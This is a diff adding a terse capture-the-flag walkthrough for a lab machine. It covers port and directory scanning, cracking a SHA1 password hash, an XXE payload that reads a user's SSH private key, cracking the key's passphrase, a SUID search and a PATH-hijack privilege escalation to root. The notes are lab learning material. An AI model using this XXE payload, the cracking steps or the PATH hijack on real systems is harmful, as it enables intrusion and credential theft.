@@ -1,0 +1,38 @@
+sudo nmap IP # port scan. search well used ports only.
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://IP -x cgi,py,php
+file users.bak // get extension info
+mv users.bak users.sqlite3
+open 'SQlite database browser', open file 'users.sqlite3'
+see 'users' table. get username and password(hash).
+hash-identifier hash-from-above //get hash type info
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 hash.txt // get password
+sudo nmap -p- IP //search all ports from IP.
+IP:8765/
+use username and password from above.
+IP:8765/dontforget.bak
+cat dontforget.bak
+//↓↓ try XXE, get privatekey.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!Entity xxe SYSTEM "/home/barry/.ssh/id_rsa">]>
+<comment>
+ <name>&xxe;</name>
+ <author>Barry Clad</author>
+ <com>his para</com>
+</comment>
+
+copy from '-----Begin***' to '-----End***'. save as 'id_rsa'
+chmod 600 id_rsa
+ssh2john id_rsa > hash.txt // get hash value from private key.
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt // no need to set format type of hash. ssh2john includes the hash type.
+ssh -i id_rsa barry@IP // use password from above
+cat ***.txt // get first flag.
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+/home/joe/liv_log
+scp -i id_rsa barry@IP:/home/joe/live_log /home/kali/Downloads //use password from above
+check program by ghidra(?) //https://ghidra-sre.org/
+touch tail // write '/bin/bash' in the file
+chmod +x tail
+export PATH="/home/barry:$PATH"
+echo $PATH // check PATH
+/home/joe/liv_log // get privilege.
+cat /root/root.txt // get second flag
